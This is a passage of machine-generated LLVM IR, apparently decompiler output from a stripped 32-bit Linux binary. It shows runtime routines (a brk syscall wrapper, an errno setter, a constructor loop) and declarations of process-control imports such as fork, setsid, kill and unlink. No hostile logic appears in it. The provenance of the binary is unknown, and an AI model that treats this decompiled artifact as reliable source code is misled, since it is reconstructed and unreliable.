  %stack_var_-4 = alloca i32, align 4
  %v0_804d083 = load i32, i32* @ebx, align 4
  store i32 %v0_804d083, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804d096 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d096, i32* @global_var_804f6d8.117, align 8
  %v7_804d0a1 = icmp ult i32 %v1_804d096, %arg1
  %v1_804d0a3 = icmp eq i1 %v7_804d0a1, false
  br i1 %v1_804d0a3, label %dec_label_pc_804d0b3, label %dec_label_pc_804d0a5

dec_label_pc_804d0a5:                             ; preds = %dec_label_pc_804d083
  %v1_804d0a5 = call i32 @function_804b330(i32 %v0_804d083)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804d0ad = inttoptr i32 %v1_804d0a5 to i32*
  store i32 12, i32* %v1_804d0ad, align 4
  %v0_804d0b4.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804d0b7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804d0b3

dec_label_pc_804d0b3:                             ; preds = %dec_label_pc_804d083, %dec_label_pc_804d0a5
  %v2_804d0b7 = phi i32 [ %v0_804d083, %dec_label_pc_804d083 ], [ %v2_804d0b7.pre, %dec_label_pc_804d0a5 ]
  %v0_804d0b4 = phi i32 [ 0, %dec_label_pc_804d083 ], [ %v0_804d0b4.pre, %dec_label_pc_804d0a5 ]
  store i32 %v2_804d0b7, i32* @ebx, align 4
  ret i32 %v0_804d0b4

; uselistorder directives
  uselistorder i32 %v1_804d096, { 1, 0 }
  uselistorder i32 12, { 36, 22, 23, 24, 25, 26, 14, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 27, 28, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 7, 69, 8, 29, 30, 31, 32, 33, 1, 16, 17, 15, 9, 12, 18, 0, 21, 20, 10, 13, 19, 2, 3, 4, 5, 6, 11, 34, 35, 70, 71, 72, 73 }
  uselistorder i32* @global_var_804f6d8.117, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d0b3, { 1, 0 }
}

define i32 @function_804d0b9() local_unnamed_addr {
dec_label_pc_804d0b9:
  %v0_804d0bc = load i32, i32* @eax, align 4
  %v1_804d0be = sub i32 0, %v0_804d0bc
  %v1_804d0c0 = call i32 @function_804b330(i32 ptrtoint (i32* @0 to i32))
  %v2_804d0c5 = inttoptr i32 %v1_804d0c0 to i32*
  store i32 %v1_804d0be, i32* %v2_804d0c5, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_804b330, { 25, 24, 39, 15, 14, 13, 23, 33, 4, 3, 12, 11, 9, 8, 32, 31, 10, 35, 5, 22, 7, 6, 20, 21, 18, 48, 19, 30, 29, 43, 47, 37, 46, 40, 28, 27, 2, 17, 42, 38, 16, 41, 26, 45, 1, 0, 44, 36, 34 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 39, 40, 41, 27, 28, 29, 24, 25, 26, 21, 22, 23, 50, 51, 52, 53, 54, 55, 42, 43, 44, 45, 46, 47, 48, 49, 34, 35, 32, 33, 30, 31, 36, 37, 38, 13, 14, 15, 16, 17, 18, 19, 20, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82 }
}

define i32 @function_804d0d0() local_unnamed_addr {
dec_label_pc_804d0d0:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_804d0dc = load i32, i32* @global_var_804f5bc.104, align 4
  %v10_804d0e1 = icmp eq i32 %v0_804d0dc, -1
  br i1 %v10_804d0e1, label %dec_label_pc_804d0fc, label %dec_label_pc_804d0f0.preheader

dec_label_pc_804d0f0.preheader:                   ; preds = %dec_label_pc_804d0d0
  br label %dec_label_pc_804d0f0

dec_label_pc_804d0f0:                             ; preds = %dec_label_pc_804d0f0.preheader, %dec_label_pc_804d0f0
  %v4_804d0f3 = phi i32 [ %v0_804d0dc, %dec_label_pc_804d0f0.preheader ], [ %v2_804d0f5, %dec_label_pc_804d0f0 ]
  %v0_804d0f0 = phi i32 [ ptrtoint (i32* @global_var_804f5bc.104 to i32), %dec_label_pc_804d0f0.preheader ], [ %v1_804d0f0, %dec_label_pc_804d0f0 ]
  %v1_804d0f0 = add i32 %v0_804d0f0, -4
  call void @__pseudo_call(i32 %v4_804d0f3)
  %v1_804d0f5 = inttoptr i32 %v1_804d0f0 to i32*
  %v2_804d0f5 = load i32, i32* %v1_804d0f5, align 4
  %v10_804d0f7 = icmp eq i32 %v2_804d0f5, -1
  %v1_804d0fa = icmp eq i1 %v10_804d0f7, false
  br i1 %v1_804d0fa, label %dec_label_pc_804d0f0, label %dec_label_pc_804d0fc.loopexit

dec_label_pc_804d0fc.loopexit:                    ; preds = %dec_label_pc_804d0f0
  %v2_804d0fc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804d0fc

dec_label_pc_804d0fc:                             ; preds = %dec_label_pc_804d0fc.loopexit, %dec_label_pc_804d0d0
  %v2_804d0fc = phi i32 [ %v2_804d0fc.pre, %dec_label_pc_804d0fc.loopexit ], [ %tmp6, %dec_label_pc_804d0d0 ]
  ret i32 %v2_804d0fc

; uselistorder directives
  uselistorder i32 %v0_804d0dc, { 1, 0 }
  uselistorder i1 false, { 186, 149, 150, 151, 152, 46, 107, 110, 203, 204, 205, 206, 208, 14, 209, 210, 207, 202, 187, 45, 188, 189, 190, 1, 192, 193, 0, 194, 195, 196, 197, 3, 198, 199, 200, 201, 2, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 153, 111, 166, 167, 168, 169, 170, 171, 172, 173, 174, 11, 176, 175, 180, 177, 178, 179, 15, 181, 182, 191, 47, 4, 108, 109, 33, 112, 113, 114, 34, 115, 116, 17, 117, 16, 80, 64, 65, 66, 67, 76, 77, 78, 79, 18, 68, 19, 69, 70, 75, 35, 23, 71, 22, 36, 5, 21, 72, 73, 74, 20, 12, 118, 119, 120, 126, 121, 122, 123, 124, 41, 125, 86, 87, 128, 127, 129, 130, 53, 54, 24, 55, 56, 131, 6, 132, 25, 148, 7, 81, 8, 82, 26, 133, 27, 42, 48, 37, 40, 49, 38, 50, 51, 52, 28, 57, 58, 59, 39, 60, 61, 62, 63, 96, 97, 98, 99, 100, 101, 102, 103, 104, 83, 84, 85, 13, 10, 88, 89, 90, 91, 92, 43, 93, 94, 95, 9, 105, 106, 134, 135, 136, 137, 143, 138, 139, 140, 141, 142, 144, 145, 146, 147, 183, 29, 185, 184, 30, 213, 211, 212, 31, 44, 32, 214 }
  uselistorder void (i32)* @__pseudo_call, { 2, 4, 0, 5, 6, 7, 3, 1 }
  uselistorder i32 -4, { 7, 8, 9, 10, 43, 44, 45, 46, 5, 47, 2, 42, 0, 1, 3, 4, 41, 48, 49, 50, 51, 52, 53, 6, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, { 22, 23, 0, 88, 152, 49, 89, 46, 47, 90, 50, 51, 91, 52, 92, 53, 93, 54, 94, 55, 95, 56, 96, 57, 97, 20, 21, 3, 4, 58, 59, 98, 60, 99, 61, 100, 24, 1, 101, 48, 62, 63, 102, 103, 104, 7, 105, 6, 106, 153, 9, 10, 107, 8, 108, 25, 149, 150, 28, 27, 29, 30, 18, 31, 64, 32, 109, 26, 151, 2, 110, 111, 84, 112, 11, 33, 146, 147, 65, 148, 34, 66, 113, 67, 114, 68, 115, 69, 116, 70, 117, 71, 118, 72, 119, 73, 120, 74, 121, 75, 122, 76, 123, 77, 124, 78, 125, 79, 126, 80, 127, 81, 128, 82, 129, 5, 17, 130, 131, 132, 133, 134, 135, 12, 35, 136, 83, 85, 144, 137, 36, 138, 13, 139, 14, 19, 37, 38, 140, 39, 40, 141, 41, 42, 142, 145, 15, 43, 44, 45, 143, 16, 86, 87 }
  uselistorder i32 1, { 193, 194, 57, 474, 195, 17, 16, 18, 196, 14, 15, 13, 197, 37, 198, 6, 199, 63, 200, 30, 201, 82, 202, 89, 203, 105, 204, 93, 205, 103, 206, 9, 11, 10, 12, 154, 43, 208, 207, 210, 209, 8, 211, 31, 213, 212, 49, 214, 218, 217, 216, 215, 67, 475, 476, 477, 220, 219, 35, 36, 132, 221, 223, 222, 95, 133, 183, 334, 125, 229, 228, 227, 226, 225, 224, 96, 97, 155, 230, 184, 233, 232, 231, 94, 156, 440, 441, 442, 234, 85, 86, 443, 444, 134, 445, 446, 447, 24, 22, 23, 185, 439, 157, 106, 107, 109, 108, 158, 235, 68, 69, 159, 448, 449, 450, 451, 452, 453, 454, 455, 456, 129, 457, 458, 459, 460, 461, 135, 462, 463, 113, 136, 464, 465, 466, 467, 137, 138, 468, 469, 470, 238, 237, 236, 71, 72, 73, 70, 74, 139, 140, 239, 141, 142, 160, 243, 242, 241, 240, 83, 186, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 161, 162, 258, 257, 259, 143, 262, 261, 260, 163, 263, 264, 41, 265, 42, 266, 51, 267, 64, 268, 48, 270, 269, 100, 272, 271, 112, 19, 274, 273, 54, 275, 66, 276, 98, 277, 99, 278, 279, 50, 281, 280, 55, 282, 7, 283, 84, 56, 164, 410, 411, 151, 412, 285, 284, 358, 359, 367, 368, 144, 145, 369, 287, 286, 360, 0, 289, 288, 165, 361, 153, 362, 363, 166, 365, 116, 117, 152, 366, 130, 20, 21, 146, 187, 364, 190, 110, 291, 290, 65, 413, 147, 45, 44, 414, 148, 1, 415, 379, 380, 381, 114, 416, 417, 292, 191, 34, 33, 32, 345, 346, 347, 348, 293, 90, 92, 91, 418, 118, 62, 61, 128, 419, 115, 294, 437, 438, 119, 120, 295, 46, 47, 370, 371, 121, 122, 372, 26, 25, 420, 336, 337, 338, 339, 167, 301, 300, 299, 298, 297, 296, 404, 405, 173, 171, 170, 340, 172, 168, 341, 342, 343, 175, 174, 344, 349, 350, 351, 352, 353, 169, 373, 354, 355, 126, 356, 357, 406, 407, 408, 409, 335, 374, 375, 376, 302, 127, 176, 377, 131, 308, 307, 306, 305, 304, 303, 2, 4, 3, 5, 378, 104, 310, 309, 88, 87, 311, 111, 177, 178, 382, 383, 314, 313, 312, 384, 385, 316, 315, 101, 102, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 317, 81, 76, 78, 77, 75, 80, 79, 403, 123, 318, 53, 52, 149, 179, 150, 319, 188, 321, 320, 422, 423, 424, 425, 426, 428, 427, 124, 432, 429, 421, 430, 431, 433, 434, 435, 436, 327, 326, 325, 324, 323, 322, 192, 58, 59, 60, 189, 328, 180, 471, 472, 473, 181, 329, 28, 27, 29, 478, 479, 480, 182, 330, 39, 38, 40, 332, 331, 333 }
  uselistorder label %dec_label_pc_804d0f0, { 1, 0 }
}

define i32 @function_804d101() local_unnamed_addr {
entry:
  %v0_804d104 = load i32, i32* @ebx, align 4
  %v1_804d105 = call i32 @function_80480b0(i32 %v0_804d104)
  store i32 %v1_804d105, i32* @eax, align 4
  %v0_804d110 = call i32 @function_80480c0()
  ret i32 %v0_804d110

; uselistorder directives
  uselistorder i32* @eax, { 40, 124, 139, 141, 142, 143, 144, 146, 61, 147, 5, 145, 11, 13, 140, 125, 127, 128, 126, 116, 117, 129, 130, 132, 133, 131, 118, 119, 41, 92, 79, 80, 90, 91, 81, 82, 88, 89, 83, 84, 86, 1, 87, 85, 6, 7, 62, 63, 77, 111, 113, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 64, 65, 66, 25, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 114, 115, 109, 93, 94, 95, 26, 96, 97, 98, 99, 100, 27, 101, 102, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 103, 104, 105, 112, 110, 106, 107, 108, 38, 39, 42, 43, 44, 45, 51, 48, 46, 47, 49, 120, 50, 121, 52, 53, 54, 55, 122, 2, 56, 57, 58, 59, 123, 60, 0, 134, 8, 135, 3, 136, 9, 148, 4, 149, 150, 137, 138, 10, 12 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 455, 69, 247, 124, 125, 384, 385, 70, 369, 494, 456, 457, 458, 171, 459, 495, 460, 386, 387, 496, 290, 497, 498, 499, 388, 389, 390, 391, 288, 500, 381, 501, 71, 502, 520, 521, 57, 4, 248, 5, 72, 249, 250, 530, 531, 116, 532, 73, 235, 74, 172, 173, 0, 503, 504, 505, 75, 289, 244, 76, 251, 506, 1, 126, 127, 77, 507, 508, 78, 79, 510, 509, 33, 34, 511, 514, 174, 236, 515, 517, 516, 31, 32, 518, 519, 80, 522, 37, 237, 81, 128, 523, 526, 525, 35, 36, 463, 129, 464, 465, 466, 467, 130, 468, 469, 470, 175, 461, 176, 462, 177, 392, 393, 394, 395, 396, 397, 398, 399, 400, 131, 132, 401, 252, 402, 253, 254, 178, 238, 255, 179, 239, 82, 256, 471, 472, 83, 84, 180, 240, 65, 26, 27, 473, 474, 475, 476, 477, 478, 85, 86, 181, 241, 64, 479, 117, 480, 60, 481, 482, 484, 257, 483, 2, 524, 512, 513, 291, 292, 294, 293, 38, 39, 403, 404, 258, 259, 405, 406, 407, 408, 409, 410, 411, 412, 260, 335, 295, 372, 296, 354, 413, 414, 527, 66, 133, 492, 336, 370, 493, 337, 338, 415, 297, 528, 529, 88, 87, 61, 6, 339, 7, 8, 40, 89, 261, 262, 263, 340, 341, 264, 118, 182, 168, 169, 170, 342, 343, 345, 346, 135, 265, 90, 134, 58, 62, 9, 91, 344, 92, 298, 93, 355, 67, 416, 417, 94, 266, 418, 419, 420, 421, 422, 423, 424, 97, 96, 95, 183, 98, 10, 11, 28, 425, 426, 427, 428, 267, 429, 430, 431, 136, 317, 41, 29, 30, 42, 318, 13, 12, 319, 268, 320, 432, 43, 269, 44, 453, 45, 63, 14, 184, 299, 300, 301, 302, 99, 100, 141, 101, 374, 375, 303, 304, 305, 306, 307, 308, 309, 310, 311, 246, 312, 313, 315, 314, 119, 316, 321, 322, 270, 47, 48, 49, 271, 323, 324, 325, 46, 326, 327, 347, 328, 329, 330, 331, 332, 333, 334, 185, 272, 377, 378, 379, 380, 245, 373, 15, 114, 273, 348, 59, 274, 349, 350, 351, 186, 352, 102, 376, 242, 103, 104, 105, 142, 243, 353, 16, 68, 275, 276, 356, 277, 357, 358, 359, 360, 361, 362, 363, 364, 143, 278, 365, 366, 367, 368, 279, 280, 281, 50, 371, 51, 106, 382, 383, 107, 115, 109, 188, 167, 440, 441, 436, 437, 144, 433, 145, 434, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 435, 438, 156, 157, 158, 159, 160, 161, 439, 162, 163, 164, 165, 166, 442, 443, 54, 444, 445, 446, 108, 447, 448, 449, 187, 450, 110, 282, 452, 18, 19, 451, 17, 52, 53, 283, 137, 138, 139, 140, 111, 112, 284, 454, 485, 486, 487, 120, 488, 20, 55, 21, 22, 285, 121, 533, 23, 56, 24, 25, 286, 122, 3, 489, 490, 491, 113, 287, 123, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 534, 535, 536, 537, 538, 539, 540, 541 }
  uselistorder i32* @ebx, { 23, 290, 291, 175, 176, 149, 352, 353, 292, 6, 293, 294, 354, 295, 355, 356, 357, 358, 359, 360, 177, 17, 178, 179, 180, 181, 182, 0, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 7, 194, 195, 196, 24, 361, 362, 171, 172, 296, 297, 363, 364, 365, 21, 22, 389, 390, 391, 392, 18, 8, 15, 376, 383, 387, 388, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 379, 380, 298, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 9, 313, 314, 299, 300, 197, 198, 199, 200, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 19, 326, 327, 328, 329, 330, 10, 331, 332, 333, 334, 335, 336, 337, 338, 339, 377, 378, 25, 26, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 76, 77, 27, 159, 160, 28, 133, 134, 229, 230, 231, 232, 381, 382, 348, 349, 78, 79, 150, 151, 350, 351, 80, 81, 233, 234, 29, 384, 385, 386, 82, 83, 84, 99, 100, 101, 102, 103, 104, 85, 86, 87, 11, 88, 89, 90, 98, 91, 93, 92, 12, 95, 94, 1, 2, 20, 96, 97, 30, 235, 236, 237, 238, 239, 240, 241, 13, 242, 243, 5, 244, 245, 66, 67, 246, 247, 248, 249, 250, 279, 280, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 68, 69, 73, 70, 14, 71, 72, 74, 75, 169, 170, 106, 105, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 166, 167, 168, 161, 162, 163, 164, 165, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 3, 16, 148, 152, 153, 154, 155, 156, 157, 158, 173, 174, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 4, 270, 271, 272, 273, 274, 275, 276, 277, 278, 281, 282, 283, 284, 285, 286, 287, 288, 289, 340, 341, 342, 343, 393, 394, 344, 345, 346, 347 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_5() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_8() local_unnamed_addr

declare i16* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
